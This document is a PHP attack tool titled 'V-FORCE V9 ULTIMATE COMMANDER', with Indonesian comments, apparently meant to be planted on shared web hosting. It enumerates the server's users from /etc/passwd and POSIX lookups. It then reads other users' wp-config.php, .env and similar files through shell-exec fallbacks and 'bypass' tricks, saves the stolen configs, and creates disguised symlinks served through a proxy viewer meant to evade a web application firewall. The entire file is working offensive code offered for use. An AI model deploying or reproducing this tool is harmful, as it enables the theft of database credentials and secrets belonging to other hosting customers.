<?php
// ================================================================
// V-FORCE V9 (ULTIMATE COMMANDER)
// Fitur: Extreme Read Fallback, Pagination, Modern UI, Proxy View
// ================================================================

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
@set_time_limit(0);

// --- KONFIGURASI ---
$save_dir = "vforce_results";
$sym_dir  = "assets_lib"; // Folder samaran symlink
$cache_file = sys_get_temp_dir() . "/vf9_users.json";
$per_page = 50; // Jumlah user per halaman untuk Symlink Generator

// Init Folders
if(!is_dir($save_dir)) @mkdir($save_dir, 0755);
if(!is_dir($sym_dir)) {
    @mkdir($sym_dir, 0755);
    // .htaccess Force Text (Anti Download)
    $ht  = "Options +Indexes +FollowSymLinks\nDirectoryIndex index.html\nAddType text/plain .php .phtml .txt\n";
    @file_put_contents("$sym_dir/.htaccess", $ht);
}

// ================================================================
// 1. EXTREME READ FUNCTIONS (REQUEST ANDA)
// ================================================================

// A. Command Executor (Wrapper 5 Metode)
function run_cmd($cmd) {
    $cmd .= " 2>&1"; // Tangkap error
    if(function_exists('shell_exec')) { $o = @shell_exec($cmd); if($o) return $o; }
    if(function_exists('exec')) { @exec($cmd, $o); $r = implode("\n", $o); if($r) return $r; }
    if(function_exists('passthru')) { ob_start(); @passthru($cmd); $o = ob_get_clean(); if($o) return $o; }
    if(function_exists('system')) { ob_start(); @system($cmd); $o = ob_get_clean(); if($o) return $o; }
    if(function_exists('popen')) { 
        $h = @popen($cmd, 'r'); 
        if($h) { $o = stream_get_contents($h); pclose($h); if($o) return $o; } 
    }
    return false;
}

// B. The Ultimate Reader (20+ Fallbacks)
function ultimate_read($path) {
    // 1. PHP Native
    $c = @file_get_contents($path); 
    if($c && strlen($c) > 10) return $c;
    
    $path_esc = escapeshellarg($path);
    
    // 2. Standard Binaries
    $bins = [
        "cat $path_esc", 
        "head -n 10000 $path_esc", 
        "tail -n 10000 $path_esc", 
        "more $path_esc", 
        "paste $path_esc", 
        "nl -b a $path_esc",
        "awk '{print}' $path_esc",
        "sed -n 'p' $path_esc",
        "grep . $path_esc",
        "rev $path_esc | rev", // Baca terbalik lalu balik lagi (Bypass cat block)
        "dd if=$path_esc",
        "xxd -p $path_esc | xxd -p -r" // Hexdump bypass
    ];

    foreach($bins as $cmd) {
        $out = run_cmd($cmd);
        if($out && strlen($out) > 10 && stripos($out, 'Permission denied') === false) return $out;
    }

    // 3. Language Injection (Jika 'cat' diblokir tapi python/perl jalan)
    // Perl
    $perl_cmd = "perl -e 'open(F, \"$path\"); print <F>;'";
    $out = run_cmd($perl_cmd);
    if($out && strlen($out) > 10) return $out;

    // Python 2/3
    $py_cmd = "python -c \"print(open('$path').read())\"";
    $out = run_cmd($py_cmd);
    if(!$out) $out = run_cmd("python3 -c \"print(open('$path').read())\"");
    if($out && strlen($out) > 10) return $out;

    // Ruby
    $rb_cmd = "ruby -e 'puts File.read(\"$path\")'";
    $out = run_cmd($rb_cmd);
    if($out && strlen($out) > 10) return $out;

    return false;
}

// ================================================================
// 2. PROXY VIEWER HANDLER (Bypass WAF)
// ================================================================
if(isset($_GET['view'])) {
    $file = basename($_GET['view']);
    $path = "$sym_dir/$file";
    header("Content-Type: text/plain");
    if(file_exists($path)) {
        // Gunakan Ultimate Read juga di sini
        $content = ultimate_read($path);
        if(!$content) echo "[ERROR] File ada tapi tidak bisa dibaca (Permission Kernel/CageFS Strict).";
        else echo $content;
    } else {
        echo "[ERROR] File symlink tidak ditemukan / rusak.";
    }
    exit;
}

// ================================================================
// 3. USER SCANNER (Aggressive)
// ================================================================
function get_aggressive_users() {
    $users = [];
    
    // A. /etc/passwd (Read or Cat)
    $etc = ultimate_read("/etc/passwd");
    if($etc) {
        foreach(explode("\n", $etc) as $l) {
            $p = explode(":", $l);
            if(!empty($p[0])) $users[$p[0]] = $p[5] ?? '/unknown';
        }
    }

    // B. Posix Loop (Bypass Text Jail)
    if(function_exists('posix_getpwuid')) {
        for($i=0; $i<=2500; $i++) {
            $u = @posix_getpwuid($i);
            if(isset($u['name'])) $users[$u['name']] = $u['dir'];
        }
    }

    // C. Mail Spool & Home Glob
    $mails = @scandir("/var/mail");
    if($mails) { foreach($mails as $m) { if($m!='.' && $m!='..') $users[$m] = '/home/'.$m; } }
    
    // Filtering
    $valid = [];
    foreach($users as $n => $h) {
        // Hapus user system
        if(stripos($h, '/home') !== false || stripos($h, '/var/www') !== false) $valid[] = $n;
    }
    $final = array_unique($valid);
    sort($final);
    return $final;
}

// ================================================================
// 4. GUI & LOGIC
// ================================================================
$action = $_GET['action'] ?? 'menu';

// ACTION: RESET
if($action == 'reset') {
    @unlink($cache_file);
    array_map('unlink', glob("$save_dir/*"));
    array_map('unlink', glob("$sym_dir/*"));
    header("Location: ?action=menu"); exit;
}

// ACTION: SCAN
if($action == 'scan') {
    $u = get_aggressive_users();
    file_put_contents($cache_file, json_encode($u));
}

// Load Cache
$all_users = file_exists($cache_file) ? json_decode(file_get_contents($cache_file), true) : [];
$user_count = count($all_users);
?>

<!DOCTYPE html>
<html>
<head>
    <title>V-FORCE V9 ULTIMATE</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Consolas', monospace; padding: 20px; font-size: 14px; }
        a { text-decoration: none; }
        .header { background: #161b22; padding: 15px; border-bottom: 2px solid #30363d; border-radius: 6px 6px 0 0; display: flex; justify-content: space-between; align-items: center; }
        .title { font-size: 20px; font-weight: bold; color: #58a6ff; }
        .stats { color: #8b949e; }
        .box { background: #0d1117; border: 1px solid #30363d; border-top: none; padding: 15px; border-radius: 0 0 6px 6px; }
        .btn { display: inline-block; padding: 8px 16px; background: #238636; color: white; border-radius: 6px; border: 1px solid rgba(240,246,252,0.1); margin-right: 5px; font-weight: bold; }
        .btn:hover { background: #2ea043; }
        .btn-gray { background: #21262d; color: #c9d1d9; } .btn-gray:hover { background: #30363d; }
        .btn-red { background: #da3633; } .btn-red:hover { background: #f85149; }
        
        .log-panel { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; height: 400px; overflow-y: scroll; margin-top: 15px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { background: #161b22; color: #58a6ff; padding: 10px; text-align: left; border: 1px solid #30363d; }
        td { padding: 8px; border: 1px solid #30363d; color: #c9d1d9; }
        tr:nth-child(even) { background: #161b22; }
        tr:hover { background: #21262d; }
        
        .pg-btn { padding: 5px 10px; background: #21262d; border: 1px solid #30363d; color: #58a6ff; margin: 2px; display: inline-block; }
        .pg-active { background: #58a6ff; color: #0d1117; }
    </style>
</head>
<body>

<div class="header">
    <div class="title">[ V-FORCE V9 ] ULTIMATE COMMANDER</div>
    <div class="stats">Detected Users: <b style="color:white"><?php echo $user_count; ?></b></div>
</div>

<div class="box">
    <div style="margin-bottom: 15px;">
        <a href="?action=scan" class="btn <?php echo ($action=='scan')?'':'btn-gray'; ?>">1. SCAN USERS</a>
        <?php if($user_count > 0): ?>
            <a href="?action=grab" class="btn <?php echo ($action=='grab')?'':'btn-gray'; ?>">2. AUTO GRAB (Direct)</a>
            <a href="?action=symlink" class="btn <?php echo ($action=='symlink')?'':'btn-gray'; ?>">3. SYMLINK GENERATOR</a>
            <a href="?action=reset" class="btn btn-red" style="float:right">RESET</a>
        <?php endif; ?>
    </div>

    <?php
    // --- MODE 1: SCAN ---
    if($action == 'scan') {
        echo "<p>Scan selesai. <b>$user_count</b> user ditemukan menggunakan metode Aggressive (Passwd + Posix + Mail + Glob).</p>";
    }

    // --- MODE 2: AUTO GRAB (Direct Read) ---
    elseif($action == 'grab') {
        echo "<div class='log-panel'>";
        echo "Mencoba membaca config secara langsung dengan 20+ Metode (PHP/Perl/Python/Shell)...<br><hr>";
        
        $configs = ['public_html/wp-config.php', 'public_html/configuration.php', 'public_html/.env', 'public_html/config.php'];
        $bases = ['/home', '/home1', '/home2', '/var/www'];
        $found = 0;

        foreach($all_users as $u) {
            foreach($bases as $b) {
                foreach($configs as $c) {
                    $target = "$b/$u/$c";
                    // Panggil fungsi ULTIMATE READ
                    $content = ultimate_read($target);
                    
                    if($content) {
                        $save_path = "$save_dir/{$u}_GRABBED.txt";
                        file_put_contents($save_path, $content);
                        echo "<span style='color:#3fb950'>[SUCCESS]</span> $u | Saved to $save_dir<br>";
                        $found++;
                        break 2; // Pindah ke user berikutnya
                    }
                }
            }
            flush();
        }
        echo "<hr>Selesai. Total didapat: $found config.</div>";
    }

    // --- MODE 3: SYMLINK GENERATOR (PAGINATION) ---
    elseif($action == 'symlink') {
        // Logika Halaman (Pagination)
        $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
        $total_pages = ceil($user_count / $per_page);
        $offset = ($page - 1) * $per_page;
        
        // Ambil potongan user untuk halaman ini
        $paged_users = array_slice($all_users, $offset, $per_page);
        
        echo "<p>Membuat Symlink Samaran (Anti-WAF). Klik tombol [VIEW] untuk memaksa baca via Proxy.</p>";
        
        // Tampilkan Navigasi Halaman
        echo "<div style='margin-bottom:10px;'>Page: ";
        for($i=1; $i<=$total_pages; $i++) {
            $cls = ($i == $page) ? 'pg-active' : '';
            echo "<a href='?action=symlink&page=$i' class='pg-btn $cls'>$i</a>";
        }
        echo "</div>";

        echo "<table><thead><tr><th>User</th><th>Target File</th><th>Method</th><th>Action</th></tr></thead><tbody>";

        $configs = ['public_html/wp-config.php', 'public_html/.env'];
        $bases = ['/home', '/home1', '/home2', '/var/www'];

        foreach($paged_users as $u) {
            $link_created = false;
            foreach($bases as $b) {
                if($link_created) break;
                foreach($configs as $c) {
                    $target = "$b/$u/$c";
                    
                    // Nama file samaran (misal: read_a1b2.txt)
                    $hash = substr(md5($u.$c), 0, 6);
                    $safe_name = "read_{$hash}.txt";
                    $link_path = "$sym_dir/$safe_name";

                    // Hapus & Buat Symlink
                    if(file_exists($link_path)) @unlink($link_path);
                    @symlink($target, $link_path);
                    
                    // Cek Symlink Valid
                    if(is_link($link_path)) {
                        $url = "?view=$safe_name";
                        echo "<tr>
                            <td>$u</td>
                            <td style='color:#8b949e'>$c</td>
                            <td style='color:orange'>Symlink -> PHP Proxy</td>
                            <td><a href='$url' target='_blank' class='btn btn-gray' style='padding:3px 8px; font-size:12px;'>VIEW CONFIG</a></td>
                        </tr>";
                        $link_created = true;
                        break; // 1 Config per user
                    }
                }
            }
        }
        echo "</tbody></table>";
        
        // Navigasi Bawah
        echo "<div style='margin-top:10px;'>Page: ";
        for($i=1; $i<=$total_pages; $i++) {
            $cls = ($i == $page) ? 'pg-active' : '';
            echo "<a href='?action=symlink&page=$i' class='pg-btn $cls'>$i</a>";
        }
        echo "</div>";
    }

    // --- DEFAULT MENU ---
    else {
        echo "<div style='text-align:center; padding:50px; color:#8b949e;'>
            <h3>Selamat Datang di V-FORCE V9</h3>
            <p>Silakan pilih menu di atas untuk memulai.<br>
            Disarankan mulai dari <b>SCAN USERS</b>, lalu coba <b>AUTO GRAB</b>.<br>
            Jika gagal, gunakan <b>SYMLINK GENERATOR</b>.</p>
        </div>";
    }
    ?>

</div>
<div style="margin-top:10px; color:#8b949e; font-size:12px;">V-FORCE V9 | Ultimate Edition</div>

</body>
</html>
